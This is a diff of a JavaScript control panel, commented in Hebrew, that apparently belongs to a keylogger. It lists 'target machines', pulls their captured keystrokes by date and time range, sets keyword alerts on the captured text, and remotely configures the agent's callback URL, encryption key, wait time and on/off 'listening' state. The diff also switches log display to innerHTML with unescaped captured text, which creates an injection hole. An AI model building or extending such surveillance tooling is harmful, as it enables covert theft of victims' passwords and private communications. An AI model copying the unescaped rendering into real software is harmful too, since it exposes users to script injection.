@@ -1,60 +1,75 @@
 // ===== מצב ושמירה מקומית =====
 const LS_KEYS = {
-  apiBase: "kl_api_base",
   alerts:  "kl_alerts",
   agent:   "kl_agent_settings",
   agentOn: "kl_agent_enabled",
 };
 
-let API_BASE = localStorage.getItem(LS_KEYS.apiBase) || "http://127.0.0.1:5000/api";
-const setApiBase = (v) => { API_BASE = v; localStorage.setItem(LS_KEYS.apiBase, v); };
+// BASE של ה-API (ללא UI; ערך ברירת מחדל, שנה פה אם צריך)
+const API_BASE = "http://127.0.0.1:5000/api";
 
 // ===== עוזרים =====
-const $ = (sel) => document.querySelector(sel);
+const $  = (sel) => document.querySelector(sel);
 const $$ = (sel) => Array.from(document.querySelectorAll(sel));
-const fmtJSON = (obj) => JSON.stringify(obj, null, 2);
+const fmtJSON  = (obj) => JSON.stringify(obj, null, 2);
 const normTime = (t) => {
   if (!t) return null;
-  const parts = String(t).replace("%3A", ":").split(":");
-  const hh = String(parts[0]).padStart(2,"0");
-  const mm = parts[1] ? String(parts[1]).padStart(2,"0") : "00";
-  const ss = parts[2] ? String(parts[2]).padStart(2,"0") : null;
-  return ss ? `${hh}:${mm}:${ss}` : `${hh}:${mm}`;
+  const [h, m] = String(t).replace("%3A", ":").split(":");
+  return `${String(h??"").padStart(2,"0")}:${String(m??"0").padStart(2,"0")}`;
 };
 const weekdayName = (dateStr) => {
   if (!dateStr) return "";
   const d = new Date(dateStr);
-  const names = ["ראשון","שני","שלישי","רביעי","חמישי","שישי","שבת"];
-  return names[d.getDay()];
+  return ["ראשון","שני","שלישי","רביעי","חמישי","שישי","שבת"][d.getDay()];
 };
 
-// ===== ניווט בין דפים =====
-function showPage(id){
-  $$(".page").forEach(p => p.classList.add("hidden"));
-  $(`#page-${id}`).classList.remove("hidden");
-  $$(".nav-links a").forEach(a => a.classList.toggle("active", a.dataset.page === id));
+// Toast
+let toastTimer = null;
+function toast(msg, ok=true){
+  const t = $("#toast");
+  t.textContent = msg;
+  t.classList.remove("hidden");
+  t.style.background = ok ? "#111827" : "#991b1b";
+  t.classList.add("show");
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(()=>{ t.classList.remove("show"); }, 1800);
 }
 
-// ===== API קריאות =====
-async function apiGetMachines(){
-  const res = await fetch(`${API_BASE}/get_target_machines_list`, { mode:"cors" });
-  if (!res.ok) throw new Error(`HTTP ${res.status}`);
+// ===== API =====
+async function apiGET(path){
+  const res = await fetch(`${API_BASE}${path}`, { mode:"cors" });
+  if(!res.ok) throw new Error(`HTTP ${res.status}`);
+  return res.json();
+}
+async function apiPOST(path, body){
+  const res = await fetch(`${API_BASE}${path}`, {
+    method:"POST", headers:{ "Content-Type":"application/json" },
+    body: JSON.stringify(body ?? {}), mode:"cors"
+  });
+  if(!res.ok) throw new Error(`HTTP ${res.status}`);
   return res.json();
 }
 
-async function apiGetKeystrokes({machine, date, start, end}){
-  if (!machine) throw new Error("בחר מחשב");
-  const qs = new URLSearchParams({ machine });
-  if (date)  qs.append("date", date);
-  if (start) qs.append("start", normTime(start));
-  if (end)   qs.append("end",   normTime(end));
-  const url = `${API_BASE}/get_keystrokes?${qs.toString()}`;
-  const res = await fetch(url, { mode:"cors" });
-  if (!res.ok) throw new Error(`HTTP ${res.status}`);
-  return res.json(); // מערך מחרוזות JSON (תוכן קבצים)
-}
+const api = {
+  // מחשבים/לוגים
+  getMachines:   () => apiGET(`/get_target_machines_list`),
+  getKeystrokes: ({machine, date, start, end}) => {
+    if (!machine) throw new Error("בחר מחשב");
+    const qs = new URLSearchParams({ machine });
+    if (date)  qs.append("date",  date);
+    if (start) qs.append("start", normTime(start));
+    if (end)   qs.append("end",   normTime(end));
+    return apiGET(`/get_keystrokes?${qs.toString()}`);
+  },
+  // התראות
+  createNotification: (payload) => apiPOST(`/notifications`,        payload),
+  deleteNotification: (payload) => apiPOST(`/deletenotifications`, payload),
+  // הגדרות סוכן
+  getSettings:   ()      => apiGET(`/get_settings`),
+  updateSettings:(data)  => apiPOST(`/update_settings`, data),
+};
 
-// ===== מחשבים (בית + לוגים) =====
+// ===== UI: מחשבים =====
 async function refreshMachines(){
   const strip = $("#machines-strip");
   const ddl   = $("#logs-machine");
@@ -62,21 +77,16 @@ async function refreshMachines(){
   $("#machines-status").textContent = "";
 
   try{
-    const list = await apiGetMachines();
-    strip.innerHTML = "";
-    ddl.innerHTML = "";
-
+    const list = await api.getMachines();
+    strip.innerHTML = ""; ddl.innerHTML = "";
     if (!Array.isArray(list) || list.length === 0){
       strip.innerHTML = '<span class="muted">לא נמצאו מחשבים</span>';
       $("#machines-status").textContent = "אין מחשבים זמינים בתיקיית הלוגים.";
       return;
     }
-
     list.forEach(name => {
-      // Chip בבית
       const btn = document.createElement("button");
-      btn.className = "machine-chip";
-      btn.textContent = name;
+      btn.className = "machine-chip"; btn.textContent = name;
       btn.onclick = () => {
         $$(".machine-chip").forEach(b => b.classList.remove("active"));
         btn.classList.add("active");
@@ -85,19 +95,18 @@ async function refreshMachines(){
       };
       strip.appendChild(btn);
 
-      // Dropdown בלוגים
       const opt = document.createElement("option");
       opt.value = name; opt.textContent = name;
       ddl.appendChild(opt);
     });
-  }catch(err){
-    console.error(err);
+  }catch(e){
+    console.error(e);
     strip.innerHTML = '<span class="muted">שגיאה בטעינת המחשבים</span>';
     $("#machines-status").textContent = "שגיאה בתקשורת לשרת.";
   }
 }
 
-// ===== התראות (localStorage לעת עתה) =====
+// ===== התראות (לוקאלי + שרת) =====
 function loadAlerts(){
   try{ return JSON.parse(localStorage.getItem(LS_KEYS.alerts) || "[]"); }
   catch{ return []; }
@@ -116,56 +125,70 @@ function renderAlerts(){
       <div>${(a.keywords||[]).map(k=>`<span class="alert-chip">${k}</span>`).join(" ") || "-"}</div>
       <div style="margin-top:8px;">
         <button class="btn" data-del="${a.id}">מחק</button>
-      </div>
-    `;
+      </div>`;
     wrap.appendChild(card);
   });
-
   wrap.querySelectorAll("[data-del]").forEach(btn=>{
-    btn.addEventListener("click", ()=>{
+    btn.addEventListener("click", async ()=>{
       const id = btn.getAttribute("data-del");
       const next = loadAlerts().filter(x => x.id !== id);
-      saveAlerts(next);
-      renderAlerts();
-      // TODO: בעתיד אפשר לשלוח DELETE לשרת: fetch(`${API_BASE}/alerts/${id}`, { method:"DELETE" })
+      saveAlerts(next); renderAlerts();
+      try{ await api.deleteNotification({ id }); toast("התראה נמחקה"); }
+      catch(e){ console.warn(e); toast("מחיקה בשרת נכשלה", false); }
     });
   });
 }
-
-function createAlert(title, keywordsCsv){
+async function createAlert(title, keywordsCsv){
   const id = crypto.randomUUID();
   const keywords = (keywordsCsv||"").split(",").map(s=>s.trim()).filter(Boolean);
-  const alerts = loadAlerts();
-  alerts.push({ id, title, keywords, createdAt: Date.now() });
-  saveAlerts(alerts);
+  const payload = { id, title, keywords, createdAt: Date.now() };
+  const alerts = loadAlerts(); alerts.push(payload); saveAlerts(alerts);
   renderAlerts();
-  // TODO: בעתיד POST לשרת: fetch(`${API_BASE}/alerts`, { method:"POST", body: JSON.stringify({title, keywords}), headers:{'Content-Type':'application/json'} })
+  try{ await api.createNotification(payload); toast("התראה נוצרה"); }
+  catch(e){ console.warn(e); toast("יצירה בשרת נכשלה", false); }
 }
 
-// ===== Agent settings (localStorage לעת עתה) =====
-function loadAgent(){
-  try{ return JSON.parse(localStorage.getItem(LS_KEYS.agent) || "{}"); }
-  catch{ return {}; }
+// ===== Agent settings (4 מפתחות בלבד) =====
+function setToggleUI(isOn){
+  const btn = $("#btn-toggle-agent");
+  btn.textContent = isOn ? "עצור האזנה" : "התחל האזנה";
+  btn.classList.toggle("btn-toggle", isOn);
+  btn.dataset.on = isOn ? "1" : "0";
 }
-function saveAgent(obj){
-  localStorage.setItem(LS_KEYS.agent, JSON.stringify(obj));
+function parseBool(v){
+  if (typeof v === "boolean") return v;
+  const s = String(v).toLowerCase();
+  return s === "true" || s === "1" || s === "on";
 }
-function renderAgent(){
-  const st = loadAgent();
-  $("#agent-api-base").value = API_BASE;
-  $("#agent-enc-code").value = st.enc || "";
-  $("#agent-wait-sec").value = st.waitSec ?? "";
-  const isOn = localStorage.getItem(LS_KEYS.agentOn) === "1";
-  $("#btn-toggle-agent").textContent = isOn ? "עצירת האזנה" : "התחלת האזנה";
-  $("#btn-toggle-agent").classList.toggle("btn-toggle", isOn);
+
+async function renderAgent(){
+  try{
+    // מצופה מבק-אנד להחזיר בדיוק את המפתחות האלו
+    const s = await api.getSettings();
+    $("#agent-url").value      = s?.url ?? "";
+    $("#agent-key").value      = s?.key_encryptor ?? "";
+    $("#agent-wait-sec").value = s?.wait_time ?? "";
+    setToggleUI(parseBool(s?.status_listen));
+  }catch(err){
+    console.warn("טעינת הגדרות נכשלה:", err);
+    // אם אין שרת, פשוט ננקה UI
+    $("#agent-url").value = "";
+    $("#agent-key").value = "";
+    $("#agent-wait-sec").value = "";
+    setToggleUI(false);
+  }
 }
 
 // ===== לוגים =====
+function showPage(id){
+  $$(".page").forEach(p => p.classList.add("hidden"));
+  $(`#page-${id}`).classList.remove("hidden");
+  $$(".nav-links a").forEach(a => a.classList.toggle("active", a.dataset.page === id));
+}
 function setWeekday(){
   const d = $("#logs-date").value;
   $("#weekday-label").textContent = d ? `יום ${weekdayName(d)}` : "";
 }
-
 async function fetchLogs(){
   $("#logs-status").textContent = "טוען...";
   $("#logs-results").innerHTML = "";
@@ -173,35 +196,23 @@ async function fetchLogs(){
   const machine = $("#logs-machine").value;
   const date = $("#logs-date").value;
   const start = $("#logs-start").value;
-  const end = $("#logs-end").value;
+  const end   = $("#logs-end").value;
 
   try{
-    const arr = await apiGetKeystrokes({ machine, date, start, end });
+    const arr = await api.getKeystrokes({ machine, date, start, end });
     if (!arr || !arr.length){
       $("#logs-status").textContent = "לא נמצאו נתונים לטווח שבחרת.";
       return;
     }
     $("#logs-status").textContent = `נמצאו ${arr.length} קבצים.`;
-
     arr.forEach((item, i) => {
       let obj = null;
-      if (typeof item === "string"){
-        try{ obj = JSON.parse(item); }catch{ obj = null; }
-      } else if (item && typeof item === "object"){
-        obj = item;
-      }
+      if (typeof item === "string"){ try{ obj = JSON.parse(item); }catch{} }
+      else if (item && typeof item === "object"){ obj = item; }
 
       const card = document.createElement("div");
       card.className = "log-card";
-      const title = document.createElement("div");
-      title.className = "log-title";
-      title.textContent = `קובץ #${i+1}`;
-      card.appendChild(title);
-
-      const pre = document.createElement("pre");
-      pre.textContent = obj ? fmtJSON(obj) : String(item);
-      card.appendChild(pre);
-
+      card.innerHTML = `<div class="log-title">קובץ #${i+1}</div><pre>${obj?fmtJSON(obj):String(item)}</pre>`;
       $("#logs-results").appendChild(card);
     });
   }catch(err){
@@ -214,68 +225,65 @@ async function fetchLogs(){
 document.addEventListener("DOMContentLoaded", ()=>{
   // ניווט
   $$(".nav-links a").forEach(a => {
-    a.addEventListener("click", (e)=>{
-      e.preventDefault();
-      showPage(a.dataset.page);
-    });
+    a.addEventListener("click", (e)=>{ e.preventDefault(); showPage(a.dataset.page); });
   });
 
-  // בית: מחשבים
+  // מחשבים
   $("#btn-refresh-machines").addEventListener("click", refreshMachines);
 
-  // התראות: יצירה/מחיקה
-  $("#alert-form").addEventListener("submit", (e)=>{
+  // התראות
+  $("#alert-form").addEventListener("submit", async (e)=>{
     e.preventDefault();
     const title = $("#alert-title").value.trim();
     const keywords = $("#alert-keywords").value.trim();
     if (!title) return;
-    createAlert(title, keywords);
+    await createAlert(title, keywords);
     e.target.reset();
   });
 
-  // סוכן: שמירה/טוגל
-  $("#btn-save-api").addEventListener("click", ()=>{
-    const val = $("#agent-api-base").value.trim();
-    if (!val) return alert("נא להזין כתובת API");
-    setApiBase(val);
-    alert("כתובת API נשמרה.");
+  // סוכן — ארבעה כפתורים
+  $("#btn-save-url").addEventListener("click", async ()=>{
+    const url = $("#agent-url").value.trim();
+    try{ await api.updateSettings({ url }); toast("url נשמר"); }
+    catch(e){ console.error(e); toast("שגיאה בשמירת url", false); }
   });
-  $("#btn-save-enc").addEventListener("click", ()=>{
-    const st = loadAgent();
-    st.enc = $("#agent-enc-code").value;
-    saveAgent(st);
-    alert("קוד הצפנה נשמר מקומית.");
-    // TODO: בעתיד POST לשרת
-  });
-  $("#btn-save-wait").addEventListener("click", ()=>{
-    const st = loadAgent();
-    const n = Number($("#agent-wait-sec").value);
-    st.waitSec = Number.isFinite(n) ? n : null;
-    saveAgent(st);
-    alert("זמן המתנה נשמר מקומית.");
-    // TODO: בעתיד POST לשרת
-  });
-$("#btn-toggle-agent").addEventListener("click", () => {
-  const isOn = localStorage.getItem(LS_KEYS.agentOn) === "1";
-  localStorage.setItem(LS_KEYS.agentOn, isOn ? "0" : "1"); // ← תוקן
-  renderAgent();
-  alert(isOn ? "האזנה הופסקה." : "האזנה החלה.");
-});
 
+  $("#btn-save-key").addEventListener("click", async ()=>{
+    const key_encryptor = $("#agent-key").value;
+    try{ await api.updateSettings({ key_encryptor }); toast("key_encryptor נשמר"); }
+    catch(e){ console.error(e); toast("שגיאה בשמירת key_encryptor", false); }
+  });
+
+  $("#btn-save-wait").addEventListener("click", async ()=>{
+    const n = Number($("#agent-wait-sec").value);
+    const wait_time = Number.isFinite(n) ? n : null;
+    try{ await api.updateSettings({ wait_time }); toast("wait_time נשמר"); }
+    catch(e){ console.error(e); toast("שגיאה בשמירת wait_time", false); }
+  });
+
+  $("#btn-toggle-agent").addEventListener("click", async ()=>{
+    const isOn = $("#btn-toggle-agent").dataset.on === "1";
+    const next = !isOn;
+    setToggleUI(next); // עדכון UI מיידי
+    try{
+      await api.updateSettings({ status_listen: next });
+      toast(next ? "האזנה הופעלה" : "האזנה נעצרה");
+    }catch(e){
+      console.error(e);
+      setToggleUI(isOn); // החזרה אם נכשל
+      toast("שגיאה בעדכון status_listen", false);
+    }
+  });
 
   // לוגים
   $("#logs-date").addEventListener("change", setWeekday);
   $("#btn-fetch-logs").addEventListener("click", fetchLogs);
 
-  // אתחול ראשוני
+  // init
   renderAlerts();
   renderAgent();
-
-  // מלא תאריך של היום בלוגים
   const d = new Date();
-  const dstr = `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,"0")}-${String(d.getDate()).padStart(2,"0")}`;
-  $("#logs-date").value = dstr;
+  $("#logs-date").value = `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,"0")}-${String(d.getDate()).padStart(2,"0")}`;
   setWeekday();
-
   refreshMachines();
 });
